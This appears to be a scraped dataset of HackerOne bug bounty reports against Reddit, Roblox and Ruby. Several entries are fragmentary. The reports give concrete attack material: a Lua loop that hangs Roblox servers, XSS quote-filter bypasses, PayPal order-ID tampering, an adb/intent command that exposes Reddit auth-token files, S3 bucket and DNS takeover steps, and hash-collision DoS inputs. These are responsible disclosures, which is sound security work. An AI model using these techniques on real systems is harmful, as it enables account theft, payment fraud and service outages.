Basically we had a bug in the way we were doing the database query that only presented itself when doing a DELETE action. Doing GET would encounter a failure of the validator which is why no data was returned (it got filtered out). So the team actually nuked that endpoint (because it's not in the UI and we don't need it from a product perspective) and fixed up the query to actually use the right selection (the difference of a Django .filter() vs a .get().).

Reddit,501-1000,0.0,No value,$500.00,Medium,5.45,Improper Access Control - Generic,Domain Takeover of Reddit.ru via DNS Hijacking,"indianajson  submitted a report to Reddit.Jun 15th (about 1 year ago)Summary
I discovered that Reddit.ru  was vulnerable to DNS hijacking via DNS provider, Reg.ru. This would allow a malicious attacker to control the content on this domain, as well as, create email addresses associated with it... I'm going to be totally honest and say that any of us ethical hackers would have nerded out giving ourselves @reddit.ru emails. 
Explanation
Reviewing the WHOIS records for Reddit.ru you will see that this is a Reddit-owned domain and that Reg.ru nameservers are listed as the authority for the domain. However, if you had run a DIG request on Reddit.ru you would have gotten a SERVFAIL error. This is because, despite having Reg.ru set as the authoritative nameserver with the domain's registrar, the hosted zone in Reg.ru had been deleted, allowing anyone to create the missing hosted zone and take control of the domain's content, including creating email accounts.
Proof of Concept / Verified Takeover
I created the missing Hosted Zone within Reg.ru as a proof of concept and to keep any malicious actors from hijacking the domain before Reddit could take corrective action. For a visible proof of concept, please check the TXT records for Reddit.ru, which will display:
Code 49 BytesWrap lines Copy Download1reddit.ru.		86400	IN	TXT	""faberge@wearehackerone""
Mitigation
Removing the Reg.ru nameservers for Reddit.ru from your registrar will remove the ability for someone to take control of the domain and will remove my control of the domain. No @reddit.ru email for me... how sad.
Impact
First, DNS hijacking of domains has a higher severity because this vulnerability allows a malicious attacker to completely control all aspects of a domain opening the door to a variety of sophisticated attacks including phishing attacks, and malware distribution. Worse yet, domains owned by reputable companies typically receive greater leniency for spam emails from email providers, thus allowing a malicious attacker to more widely distribute spam than would otherwise be possible.
Second, similar to subdomain takeovers, DNS hijacking has become a more severe issue with the advent of open source tools such as Modlishka, which would allow a malicious actor to invisibly operate a high fidelity spoof of Reddit. Simply put, nothing would indicate to a user that the site was being controlled by someone else, however, a malicious attacker would be able to invisibly siphon sensitive information without any way to identify the domain as compromised. This would be a highly effective way to siphon Russian user's Reddit credentials.  An ideal option would be to run advertisements on Google Ads targeting  Russian searches for reddit. 
Third, since this is a primary domain of Reddit (reddit.ru) the value of this takeover is substantially higher for its ability to negatively impact the brand and would have proven more useful had any of the attack vectors listed above to be executed against it compared to any of the other ~1,000 domains owned by Reddit. 
Overall, this takeover presents a real and present danger to Reddit, Inc.",https://hackerone.com/reports/1226891,California,United States,San Francisco,2021,6,15,4,41

Users who upload HEIC/HEIF files (sometimes called ""Live Photos"")  to reddit.com or old.reddit.com expect their GPS metadata to be stripped before being displayed publicly. Uploaded HEIC files are converted to PNG, but GPS metadata is incorrectly preserved, in violation of user privacy. The problem is likely device- and browser-agnostic, and mostly affects Safari users on Mac since other devices and browsers either automatically convert to a different format or do not permit HEIC files to be uploaded through the usual user flow.
Impact:
All users who have submitted HEIC files have their GPS locations exposed publicly, which can be scraped with little detection and no authorization.
Steps To Reproduce:

Take a Live photo on an iPhone 11 Pro with GPS location tagging enabled
Sync the photo to iCloud Photos
Upload HEIF/HEIC file to Reddit.com via Safari on macOS Big Sur (Example Screen_Shot_2020-12-29_at_5.00.34_PM.png (F1138749))

I was also able to reproduce this flow through Internet Explorer on Windows 10 (but not Edge), which means the issue is likely device- and browser-agnostic.
However, when I tested the following flows, I found that GPS metadata was correctly removed for:

Reddit iOS app on iPhone
Safari on iPad (local testing shows iOS converts it to a JPEG before uploading)

For some tests, I wasn't able to upload HEIC photos at all:

Chrome and Firefox on Mac (HEIC not supported by image/* MIME filter on accept attribute)
Chrome, Firefox, and Edge on Windows (Windows does not recognize HEIC as an image file)
Safari on iPhone (no option to upload photos on mobile view)
Safari on Mac after having changed the file extension from .HEIC to .PNG (not actually changing the file otherwise)

It seems likely that only Safari for Mac and Internet Explorer allow HEIC files to be uploaded directly to Reddit. All other methods I've tried seem to result in normal metadata scrubbing.
I was able to find location data for at least one other user in the wild: https://i.redd.it/1hn2uafmwu661.png (post). Downloading this image, I can see their GPS location:

Reddit,501-1000,0.0,No value,$500.00,Medium,5.45,Denial of Service,Hash-Collision Denial-of-Service Vulnerability in Markdown Parser,"nicolaas  submitted a report to Reddit.Sep 16th (about 1 year ago)Summary:
We have found three bugs in Reddit's markdown parser. Two of these bugs are exploitable to launch an algorithmic complexity denial-of-service (DoS) attack. In this report we explain the bugs and exploits. We also show, in a non-disruptive way, that it appears to exist in the current version of Reddit.
Context:
Reddit uses a markdown parser to convert markdown text into HTML text. Among the features that markdown text provides, is the ability to define and use named references. In markdown a reference is defined with the following syntax:
[reference_name]: https://www.example.com
A reference can be used with the following syntax:
[reference_name]
The resulting HTML text, will contain a link to https://www.example.com with the text reference_name:
<a href=""https://www.example.com/"">reference_name</a>
In the backend, this feature is implemented with a hash table data structure that maps the reference name (the key) to the associated URL (the value). When a reference is defined, a hash function is used to convert the reference name into an integer (the hash value), which is mapped to an index in an array, by taking the modulus with the array length. The reference is inserted in the array at this index (code). As there may be references with different names but identical hash values (known as collisions) a linked list is kept at each index in the array. Each collision is inserted at the start of the linked list at the index it maps to.
When a reference is used, the hash value and array index are calculated again. Then, the linked list is iterated until a reference with an identical hash value is found (code).
(Note: This behavior is faulty, see Bug 3).
Bugs:
Bug 1: The hash table uses a weak hash function
The hash function for the reference hash table is implemented in a function named hash_link_ref. This is a case-insensitive version of the SDBM hash function. This is a weak hash function, meaning that an attacker can reliably generate a large number of collisions for it. This makes the hash table vulnerable to a hash-collision DoS attack, a type of algorithmic complexity attack. In this attack, an attacker inserts a large number of collisions into the hash table. All these references will be put into the same linked list, increasing its length. Then, when a reference is used, a very large linked list needs to be iterated to find the correct entry. As a result, the time to retrieve a reference increases linearly with the number of colliding entries (O(N), where N is the number of colliding entries). This is considered an algorithmic complexity vulnerability, as the expected behavior of a hash table is to have constant time retrieval and insertion (O(1), i.e. the retrieval and insertion time are unaffected by the number of entries in the table). These vulnerabilities can be exploited in DoS attacks.
We show a proof-of-concept exploit for this vulnerability in the Proof-of-Concepts section.
Bug 2: The hash table allows duplicate entries
Typically, a hash table only allows unique keys. While allowing duplicate keys improves the insertion time (to O(1)) (code), it leaves the hash table vulnerable to a different algorithmic complexity attack. This attack is similar to the attack on Bug 1, but is simpler to execute, because it does not require many colliding entries. Instead, an attacker can create a long linked list with duplicate entries and trigger long retrieval time by using the reference associated with the last entry in the linked list. (This will be the first defined reference, as each definition is inserted at the start of the linked list)
We show a proof-of-concept exploit for this vulnerability in the Proof-of-Concepts section.
Bug 3: The hash table determines key equality on hash value alone
In the hash table implementation, when a reference name is used, an entry in the hash table is retrieved by searching for a reference with the same hash value (code). This behavior is incorrect. Since there are more possible distinct reference names than hash values, there are necessarily different reference names with the same hash value (by the pigeonhole principle). This means, an incorrect reference may be retrieved for a reference name. For example, with respect to the SDBM hash function, the input strings 37qpypz and uvhisfu collide, as they both produce the hash value 7150400. Therefore, defining and using two references with these names:
Code 97 BytesWrap lines Copy Download1Link 1: [37qpypz]
2Link 2: [uvhisfu]
3[37qpypz]: http://www.url1.com
4[uvhisfu]: http://www.url2.com
Will result in the second URL being retrieved for both references, which leads to the HTML text:
Code 103 BytesWrap lines Copy Download1Link 1: <a href=""https://www.url2.com/"">37qpypz</a>
2Link 2: <a href=""https://www.url2.com/"">uvhisfu</a>
This bug cannot be exploited to perform malicious actions (as far as we know), but it is useful to show that the current version of Reddit is still vulnerable to attacks on Bugs 1 and 2.
Proof-of-Concepts:
To illustrate the vulnerabilities caused by Bugs 1 and 2, respectively, we will measure the time it takes for the markdown parser (running locally) to parse both random and malicious reference names in markdown text. The markdown text will be formatted as follows:
Code 67 BytesWrap lines Copy Download1[s1]: /url
2[s1]
3[s2]: /url
4[s1]
5[s3]: /url
6[s1]
7...
8[sN]: /url
9[s1]
Each string si is a reference name generated either randomly or in a specific way to exploit either Bug 1 or 2. We will measure the parsing time while increasing N to show that it grows faster for the malicious input than for the random input. The reason for this is:
Each pair
Code 15 BytesWrap lines Copy Download1[si]: /url
2[s1]
contains both a reference definition and a use. Each definition will insert a new entry into the hash table and the use will retrieve the first defined reference from the table. For malicious input, every definition will insert a reference at the start of the same linked list as the first defined reference. This means, every time we use the first defined reference after a new definition, a longer linked list will need to be iterated to retrieve it.
Conversely, for random reference names, each definition will insert the reference into a random linked list in the hash table. If the randomly named reference is not inserted into the same linked list as the first defined reference, the time to retrieve the latter will be unaffected. Therefore, we expect to observe a much faster growth in parsing time for malicious input than for random input. Note, we will still observe an increase in retrieval time for randomly named references, due to randomly occurring collisions. We perform these experiments and plot the input size (x-axis) against the parsing time (y-axis). We show the graph below, which illustrates the expected behavior.

Next, we explain how we generate malicious input for both attacks on Bug 1 and Bug 2.
That is, how we generate s1, s2,  ... , sN.
Bug 1:
In the typical hash-collision DoS attack, one would simply generate a large number of collisions for the hash function. However, due to Bug 3, this will not work in this case, since the first item in the linked list will be returned (in time O(1)) as it has the same hash value.
Therefore, instead, we find many non-colliding strings, s1, s2, ..., sN such that:
hash(si) != hash(sj) when i != j, but (hash(si) % T) == (hash(sj) % T) for all i and j,
where T is the hash table size. In other words, each string has a unique hash value, but they are all still inserted into the same linked list, because they map to the same table index after taking the modulus with the table size.
Bug 2:
Generating malicious input to exploit Bug 2 is significantly easier. We only find two strings s’ and s’’ such that
hash(s’) != hash(s’’) but (hash(s’) % T) == (hash(s’’) % T)
Then, let s1 = s’ and s2 = s’’, s3 = s’’, ..., sN = s’’. Since the hash table does not prevent us from entering string s’’ multiple times, we can increase the linked list length by reusing the same string.
Steps to Reproduce:
Since DoS attacks are out of scope for Reddit's bug bounty program, we need a non-disruptive way to show that the bugs exist in the current version of Reddit. To this end, we use Bug 3. Since the hash table considers reference names with the same hash value to be equal, the first entry in the linked list with the correct hash value will be returned. We can confirm that SDBM hash is used by the current version, by using a small number of colliding reference names, each with a unique URL, and observing the generated HTML text. If SDBM hash is indeed used, the use of any of these references will incorrectly yield the final URL (as this is first in the linked list).
We show the setup and outcome of this experiment. In the first image, we show the markdown text we use in a private message. Note that each of the reference names point to a different URL. Each of the reference names we use collide with respect to the SDBM hash function.
Image F1450704: snudown_bug3_msg_markdown.png 146.08 KiBZoom in Zoom out Copy Download
In the second image, we show the HTML text of the received private message, created from the markdown text. It is clear that the same URL (https://www.example.com/10) was retrieved, regardless of which reference name was requested. This is the incorrect behavior we expect if SDBM hash is used, which means Bug 1 exists in the current version of Reddit.

Suggested Fixes:
We have implemented the fixes suggested below in a private fork of a security advisory, created on our fork of Snudown. Upon request, we can add members from the Reddit team as collaborators on this security advisory, to review the suggestions.
Bug 1:
Bug 1 can be patched by replacing the SDBM hash function with a more secure, keyed hash function. A number of hash functions were created to mitigate hash-collision DoS vulnerabilities, such as HighwayHash and SipHash.
Bug 2:
Bug 2 can be patched by updating the function that inserts references into the hash table. After retrieving the correct linked list to insert the new reference into, this linked list should first be iterated to ensure the same reference does not already exist therein. Note, what the hash table considers to be the same reference should also be updated (see Suggested Fixes for Bug 3).
Bug 3:
When iterating the linked list to determine if a reference exists in it, the reference names should be compared, not only the hash values.
Attachments:
We have attached some files that allow one to build the markdown parser and test proof-of-concept exploits for Bug 1 and 2 locally.

Impact
If one, or more, attackers repeatedly force a server to parse maliciously crafted markdown text using Snudown, it may significantly impact the availability of the server and even lead to DoS.5 attachments:F1450704: snudown_bug3_msg_markdown.pngF1450705: snudown_bug3_msg_html.pngF1450715: snudown_poc_plot.jpgF1450740: report_input.mdF1450818: snudown_proof_of_concept.zip",https://hackerone.com/reports/1341957,California,United States,San Francisco,2021,9,16,19,8
Reddit,501-1000,0.0,No value,$500.00,Medium,6.1,Business Logic Errors,IDOR to pay less for coin purchases on oauth.reddit.com via /api/v2/gold/paypal/create_coin_purchase_order in `order_id` parameter,"yanouhd  submitted a report to Reddit.Jun 1st (about 1 year ago)Summary:
This vulnerability consist of modifying the PayPal transaction ID to buy a big coin pack but paying the small price for it.
Impact:
The only impact here could be that you don't earn the money you deserve, and users can offer a lot of presents to other users, breaking the magic of the reddit community.
Steps To Reproduce:
Here are the steps to reproduce : 


Click on the PayPal button to buy the smallest package (1.99$ for 500 coins at the time of writing).


By intercepting requests,  you should see a POST to https://oauth.reddit.com/api/v2/gold/paypal/create_coin_purchase_order, with this body :
coins=500&pennies=199&correlation_id=b0fc62e4-e759-4b9e-be52-da4c926560ce


The response to this request is an order_id, keep it aside. This is the order_id corresponding to a PayPal transaction with an amount of 1.99$.
{""order_id"": ""1CR56170K7852611T""}


Cancel the order, then make a new one with a bigger package (I took the 3.99$ for 1100 coins for my tests.)


Keep intercepting requests until you make it to the POST /api/v2/gold/paypal/create_coin_purchase_order one.


Now instead of forwarding the real response, change the order_id of this order to the one you kept from the 1.99$ transaction.
{""order_id"": ""1CR56170K7852611T 1F444042JJ523625W""}


You will be redirected to the PayPal transaction page with an amount of 1.99$ to pay.


Pay, and boom ! You paid 1.99$, but when you complete the order you will be given the amount of coins you ""purchased"" for the ""fake price"".

I started testing for unrestricted file uploads and quickly discovered a way to upload a corrupted file into Reddit. I was able to bypass the MIME type of uploaded files first by uploading a normal PNG file to Reddit, intercepting the request with burp, and changing the content type from image/png to image/svg+xml, then changing the content of the PNG image to an SVG file which is intended for Stored XSS. The file successfully uploads and I receive a 201 created message back. When trying to upload there is infinite loading time and the post never actually gets posted, but I found a way to bypass this, first, you upload a completely normal PNG file and after it uploads, you do the aforementioned steps to upload an unrestricted file and you can successfully post the corrupted image. When clicking on the post the message processing image... appears and the file never loads.
Now comes the Web Cache Poisoning which ultimately leads to a complete DoS on the Reddit Home page. Once the corrupted image has been posted this will affect every user that follows the account that posted it, there is a full DoS that requires NO user interaction Something went wrong. Just don't panic appears as well as another error message saying We weren't able to load posts for this page. If the attacker wants to create more impact he can feed the URL to users who do not follow him.

This issue is so persistent that a user can reload the page, close it and open it again, close the browser, log out and log back in, and they still won't be able to access Reddit. This issue becomes even more persistent if a victim follows the attacker or the account posting it, the victim can try to clear the cache, clear cookies, restart the browser but the issue will still be there, there is no way of getting rid of it.
Steps To Reproduce:

As an attacker, click on 'Create Media Post' on the home screen
First choose your profile to post the corrupted image
Add a title as usual and first upload a normal png image this is a very important step
After doing so click on the + sign next to the image you just uploaded and select a normal PNG image
Intercept the request within Burp
Navigate to Content-Type: parameter and replace image/png with image/svg+xml
Replace the content of the PNG image with an SVG file code, I specifically used the following code:

I hope this report should not be closed as INFORMATIVE
Summary:
The add comment endpoint was improperly rate-limited so the potential attacker could post a large number of comments, overloading the server .
Description:
The add comment endpoint has a speed limit, but the number is set too high, so speed limiting is activated when you write more than 1000 comments per minute.
Environment:
Scope: Web Application
Attack type: OWASP API TOP10 Lack of Resources & Rate Limiting
Maximum user privileges needed to reproduce your issue: no privileges
Steps To Reproduce:
1.Go to any post.
2.Turn on Intercept and Add a Comment.
3.Send request to Intruder.
4.Set your payloads and start attack.
5.There is no rate-limit.
Note:
If there is any problem in reproduction from your side then i will provide you with video poc.
POC:
You can observe the time taken to load the post before performing the attack and after performing the attack. It will show  that the post takes alot time to load after the attack. 
Fix:
Developers alleviated the problem by setting the speed limit to low for endpoints that set the speed too high.

Impact:

Attacker can affect Upvote Percentage of private subreddit posts, although he does not have access to this private subreddit posts.

We can simply repeat this request in parallel to get more coins.

I did 10 parallel requests and got 9 of them through. An actual attacker will do more requests and get more coins. Like for example, they can do 40 requests and maybe if 35 of them get through they have 35x times the coins intended.

Create third-party app using snippet (Replace UserName to victims username i.e. file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.Strong-Sun628.xml) :

Code 294 BytesWrap lines Copy Download1        Intent intent = new Intent();
2        intent.setClassName(""com.reddit.frontpage"", ""com.reddit.frontpage.RedditDeepLinkActivity"");
3        intent.setData(Uri.parse(""file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml""));
4        startActivity(intent);

Once open third-party app, Reddit app opens InAppBrowser with auth_active file and its data contained token.
We could also reproduce this quickly using adb:

Code 182 BytesWrap lines Copy Download1adb shell am start -n ""com.reddit.frontpage/com.reddit.frontpage.RedditDeepLinkActivity"" -d ""file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.frontpage_preferences.xml""
Supporting Material/References:
Video : Proof of concept

reddit.mp4 (F1225199)

if required I can submit complete POC to show how third-party app could save this files and send to attackers server.
Thanks

Summary:
 I have found that in the code of full-build-macos.sh in rpanstudio on github(https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/install-dependencies-osx.sh) contains a  s3 bucket which was unclaimed i.e (https://obs-nightly.s3-us-west-2.amazonaws.com)
Steps To Reproduce:

Create a s3 bucket with name obs-nightly and us west 2 region
Upload files  with the name same as given in the code  (e.g. cefbinary${1}_macosx64.tar.bz2)
Make the settings and change it as a static website 
You have successfully taken the s3 bucket and now when any user runs the code the url with s3 get executed and an attacker can spread dangerous malware.

Remediaton
You should remove the unclaimed s3 bucket as soon as possible from both the codes as it possess a critical risk
Impact
An attacker can takeover the s3 bucket and can host his malicious content with the name (cefbinary${1}_macosx64.tar.bz2) as presented in the code and can spread ransomware and many malicious files. This bug has a critical impact because the code of the tool that many people uses, contains unclaimed s3 bucket.

Roblox,1001-5000,0.0,50m-100m,$800.00,Medium,5.4,Insecure Direct Object Reference (IDOR),Insecure redirect rule results in bypassing ban redirect on certain pages,"b62ba6bd20eb778df2a0691  submitted a report to Roblox.Sep 27th (3 years ago)Description
Account bans on Roblox work via redirect rules. If an user attempts go to a page that's outside a whitelisted set of rules, they'll be redirected back to the ban page.
After researching, I've found that the following rules are whitelisted and bypass this redirect:

Any URLs ending in a file extension (except for .aspx, .ashx)
https://www.roblox.com/request-error/*
https://www.roblox.com/login/*
https://www.roblox.com/info/*
https://www.roblox.com/support/ *
https://www.roblox.com/*/membership/*

All of these seem okay, except for https://www.roblox.com/*/membership/*. The /membership/ part is not anchored to the start of the URL.
In ASP.NET, we can actually insert paths after the extensions .aspx and .ashx, which will just be ignored by the server.
This allows us to access any pages ending in .aspx/.ashx without a ban-redirect, just by appending /membership/ after the extension. Ex.: https://www.roblox.com/my/money.aspx/membership/
Impact
An attacker would be able to access the following pages/apis with a banned account:

Create/update assets - https://data.roblox.com/Data/Upload.ashx
Post comments on assets - https://www.roblox.com/API/Comments.ashx
Trade Items (Unverified)   - https://www.roblox.com/Trade/tradehandler.ashx
Use any other page or API ending in .ashx/.aspx

A moderator couldn't do anything to stop the attacker from performing these actions. Bans would be ineffective.
Another thing I would like to mention is that banned accounts can access ANY web apis at api.roblox.com, without a need for a bypass or anything.Summary by b62ba6bd20eb778df2a0691An insecure redirect rule allowed an attacker to bypass the ban redirect on pages ending in .aspx/.ashx.
Additionally, I have also mentioned in my report that api.roblox.com did not have a check for banned authenticated sessions.",https://hackerone.com/reports/703058,California,United States,San Mateo,2019,9,27,16,31
Roblox,1001-5000,0.0,50m-100m,$500.00,Medium,5.45,Denial of Service,Malformed string sent through FireServer leads to server freezing/hanging,"albertl  submitted a report to Roblox.Aug 22nd (3 years ago)This was found an hour ago so if I get any information wrong, please comment and I'll get back to you!
A cheater/exploiter can hang any Roblox gameserver due to a 5 line script which sends a big malformed string through SayMessageRequest resulting in the server to hang itself. This works in any game that has the ""SayMessageRequest"" remote and can be done easily, especially if the attacker has some sort of ""script execution"" exploit on their hands.
To reproduce this exploit:
Go into Roblox Client/Studio
Execute this into the cmdbar
Code 234 BytesWrap lines Copy Download1local malformed = string.rep(""ก็็็▌▓"", math.random(10000, 2e5))
2local remote = game:GetService'ReplicatedStorage'.DefaultChatSystemChatEvents:WaitForChild'SayMessageRequest'
3while wait() do
4	remote:FireServer(malformed, malformed)
5end
Watch the server hang itself (try walking around).
Note: If done on Studio while playing solo, it seems to hang the entire program. Luckily I found a workaround to this by testing it in a local server with 2-3 players and then executing it on any of the player instances.
I've attached a PoC video.

Roblox,1001-5000,0.0,50m-100m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,Reflected XSS through multiple inputs in the issue collector on Jira,"jackb898  submitted a report to Roblox.Jul 11th (4 years ago)**Note I put this as Medium because that's what the CVE is. This vulnerability is known and it's classified under CVE-2018-5230. Here's a link to the thread on it by Atlassian: https://jira.atlassian.com/browse/JRASERVER-67289
Description
I noticed when testing that your Jira installation at jira.roblox.com is running on version 7.6.3, which isn't the latest version. When you have something like Jira or Wordpress, having the latest installation is critical because lots of vulnerabilities for previous versions will be disclosed right after the company releases the latest version. That was the case here.
So I decided that since it was on 7.6.3, I'd check CVEs and see if there were any that effected Jira installations 7.6.3 and newer. After a LOT of scouring (there's tons of CVEs for Jira on older or different platforms) I found CVE-2018-5230, which isn't very helpful but it led me in the direction of the issue collector.
CVE-2018-5230 outlines ""XSS in the issue collector"" but doesn't specify anything, so that was left up to me.
Locations
After some testing in all of the issue collector, I've compiled this list of the reflected XSS locations in it. To make it easier, I've set this up with each having it's own number and explanation on how to use it.
There's only one filter that I've found for these; when using certain HTML tags like ""src="" and in JS alerts using alert(""texthere""), it appends two backslashes, ex. if you put in this payload: 
Code 36 BytesWrap lines Copy Download1<iframe src=""//google.com""></iframe>
The output in the page will be:
Code 50 BytesWrap lines Copy Download1<iframe src=""\&quot;//google.com\&quot;""></iframe>
HOWEVER I found a bypass to this filter; instead of using double quotes, simply use all single quotes in payloads. For example if you use the payload 
Code 36 BytesWrap lines Copy Download1<iframe src='//google.com'></iframe>
The output will be:
Code 36 BytesWrap lines Copy Download1<iframe src=""//google.com""></iframe>
1ST AREA
https://jira.roblox.com/issues/?filter=-8 in the ""Updated Date"" section.
HOW TO EXPLOIT:

Go to the link above
Click the ""Updated Date:"" text area
Put your XSS payload in ""More than [ ] minutes ago"" (15 character payload limit) or in ""In range [   ] to [   ]"" (No length limit, ONLY put the payload in the first box)
Click Update
Payload will run. If it doesn't run chances are you used double quotes somewhere. Only use single quotes!

Each area past this first one uses the exact same method of exploitation and has the same inputs/outputs so I'll just put the links to them
https://jira.roblox.com/issues/?filter=-7
https://jira.roblox.com/issues/?filter=-6
Resolution
Update your JIRA version to 7.6.7 or later, might as well update to the latest version. This should sufficiently patch all of these vulnerabilities.
Additional Information
I know this isn't a core Roblox domain but I strongly believe it has the same impact regardless; as you can see from the attachment:
Image F319184: fb6e03df7ca0f99504a9d2b39770dc0d.png 40.45 KiBZoom in Zoom out Copy Download
The core Roblox cookies are shared onto this domain, so that's a main factor in why this has equal impact as to if it were on roblox.com.
Impact
An attacker could use carefully crafted payloads with simple social engineering to steal Roblox user's accounts. As I've mentioned, the cookies from Roblox's core site are shared with this one as well, and while it may not be a core Roblox site, it's still a *.roblox.com so any suspicions of phishing by the victim could be excused with that reasoning.
Additionally, with XSS you can use specially designed iframes linked to your own JS content, allowing jacking of cookies and other information from the victim.1 attachment:F319184: fb6e03df7ca0f99504a9d2b39770dc0d.pngSummary by jackb898I was able to decipher a CVE and apply it, in this case leading to reflected XSS through multiple inputs on the Jira issue collector.

A few days ago, I was looking at Roblox subdomains, and I noticed an unusual one called creatorforum.roblox.com. Upon further investigation, I visited it and saw that creatorforum.roblox.com's CNAME was a nonexistant Discourse website.
I immediately reported to info@roblox.com, and eventually talked to Antek Baranski on the bugbounty@roblox.com email address. The issue has been fixed since reporting, but I was told to send a report here.
If I had a Discourse account, I could've taken over the CNAME for creatorforum.roblox.com and then it would've been a full subdomain takeover on that subdomain.
As mentioned earlier in the report, the issue has been resolved and as you can see the subdomain creatorforum.roblox.com no longer exists.

Impact
Let's talk about about in details, as attacker could possible takeover other users account. 

As .ROBLOSECURITY cookies is scoped to *.roblox.com means same cookies shared with all other subdomain, i'm not much familiar with hubspot with hosting following code on will steal all the users cookie who visit this subdomain.

Background:
Sending a POST request to set.php with age='PAYLOAD' will cause a stored XSS on the GET.php file (most likely caused by the cookie, since that's what the age is based on). For this vulnerability and in order to demonstrate BOTH CSRF and XSS I have written a simple script (tested on firefox)  that automatically sends the request to set.php and redirects you to the vulnerable file:

The value of the tags parameter is sent as an XHR request to /newswire/tagContent/[tags_param]/1 and the response gets printed in the page , also I have found that if the content-type of the response is application/javascript , it gets executed as javascript.
After digging for a while I found this endpoint www.rockstargames.com/comments_dal/users/getGlobalLoginSettings.json which returns a callback function in the response if the request is XHR. so I used the callback function to execute javascript through ?callback=alert(/xss/);//

The issues lies in using strdup in generator.c, which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in space_len. Eventually fbuffer_append will copy the length of the string (e.g. the 1024 above) into the generated buffer.

Proposed patch is as follows. Note that I avoid the easy way of checking for overflow ie.
Code 19 BytesWrap lines Copy Download1beg_i + len < beg_i
since that implies a signed integer overflow which is officially undefined behavior in C and reportedly may lead to unexpected results on some architectures. But feel free to implement a patch however you want.

Note that malice isn't necessarily required to trigger this vulnerability; any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).
The vulnerability is not expected to work on 64 bit systems because of the much larger limits of the long type, and the requirement that the sizes of the buffers and available heap memory are accordingly large.

Ruby,501-1000,1.0,No value,$500.00,Medium,6.2,Buffer Under-read,controlled buffer under-read in pack_unpack_internal(),"aerodudrizzt  submitted a report to Ruby.Dec 15th (5 years ago)Brief
There is a signedness error in the pack_unpack_internal(), allowing the '@' type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).
Code Vulnerability
Vulnerable version: 2.5.0 (rc) and prior (tested also on 2.3.3)
Scope: works on 32 bit and 64 bit versions
File: pack.c
Function: pack_unpack_internal()
Code Trace:


len is a signed long: 
Code 13 BytesWrap lines Copy Download1    long len;


len can be parsed using a decimal string representation, to hold any unsigned long value
Code 156 BytesWrap lines Copy Download1...
2else if (ISDIGIT(*p)) {
3    errno = 0;
4	len = STRTOUL(p, (char**)&p, 10);
5    if (errno) {
6	rb_raise(rb_eRangeError, ""pack length too big"");
7    }
8}
9...


Using a negative len value, the '@' type will move the string backwards:
Code 256 BytesWrap lines Copy Download1...
2case '@':
3    // EI - Trace: negative length will pass this check
4    if (len > RSTRING_LEN(str))
5	  rb_raise(rb_eArgError, ""@ outside of string"");
6     // EI - Trace: negative length will move s backwards
7    s = RSTRING_PTR(str) + len;
8    break;
9...


Later unpacking will parse memory data before the buffer's start


PoC Script
The script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).

Proposed Fix:
len should be limited to hold only positive values, and it should be enforced right after len is parsed. A different fix could be to specifically check if len is negative in all dangerous places in the unpack() function.
Impact
Impact
An attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a massive and controlled information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.
This vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.hsbt Ruby staff  posted a comment. Dec 15th (5 years ago)ack, We are evaluating it.hsbt Ruby staff  posted a comment. Dec 18th (5 years ago)@adambacchus We considered that your report was a vulnerability of String#unpack.

By exploting this, an attacker can inject malicious escape sequences to its logs.  This issue is exactly the same as the old already-fixed vulnerability.
How to reproduce:
1) Run this WEBrick server program in a terminal.
Code 331 BytesWrap lines Copy Download1require ""webrick""
2require ""webrick/httpauth""
3
4srv = WEBrick::HTTPServer.new({ Port: 34567 })

7srv.mount_proc(""/"") do |req, res|
8  authenticator.authenticate(req, res)
9  res.body = ""foobar""
10end

Ruby,501-1000,1.0,No value,$500.00,Medium,6.5,Cryptographic Issues - Generic,imap: StartTLS stripping attack (CVE-2016-0772).,"chinarulezzz  submitted a report to Ruby.Apr 28th (2 years ago)net/imap does not seem to raise an exception when the remote end (imap server)  fails to respond with tagged_response (NO/BAD) or OK to an explicit call of imap.starttls. This may allow a malicious MITM to perform a starttls stripping attack if the client code does not explicitly set usessl = true on  initialize where it is disabled by default: it is rarely done as one might expect that starttls raises an exception when starttls negotiation fails (like when using usessl on a server that does not support it or when it fails to negotiate tls due to an ssl exception/cipher mismatch/auth fail).
The vulnerable code:

Impact
Allows man-in-the-middle attackers to bypass the TLS protections by leveraging a network position between the client and the registry to block the StartTLS command, aka a ""StartTLS stripping attack.""1 attachment:F1281885: striptls.py",https://hackerone.com/reports/1178562,No value,No value,No value,2021,4,28,16,6
Ruby,501-1000,1.0,No value,$500.00,Low,3.7,Information Disclosure,lib/net/ftp.rb: trusting PASV responses allow client abuse,"chinarulezzz  submitted a report to Ruby.Apr 2nd (2 years ago)When net/ftp performs a passive FTP transfer, it tries to using PASV.  Passive mode is what net/ftp uses by default.
A server response to a PASV command includes the (IPv4) address and port number for the client to connect back to in order to perform the actual data
transfer.
This is how the FTP protocol is designed to work.[^1] 
A malicious server can use the PASV response to trick net/ftp into connecting back to a given IP address and port, and this way potentially make it extract information about services that are otherwise private and not disclosed, for example doing port scanning and service banner extractions.
If net/ftp operates on a URL provided by a user (with by all means is an unwise setup), a user can exploit that and pass in a URL to a malicious FTP server instance without needing any server breach to perform the attack.
Other FTP clients have in the past also had this flaw and have fixed it at different points in time:

Chrome in 2009: https://github.com/chromium/chromium/commit/a1cea36673186829ab5d1d1408ac50ded3ca5850
Curl in 2020 (CVE-2020-8284) : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8284
Firefox in 2007 (CVE-2007-1562): https://bugzilla.mozilla.org/show_bug.cgi?id=370559. In that bugzilla issue there's also a link to paper that describes exactly this and lists a few affected clients (link to archive.org since the original has vanished) https://web.archive.org/web/20070317052623/http://bindshell.net/papers/ftppasv/ftp-client-pasv-manipulation.pdf

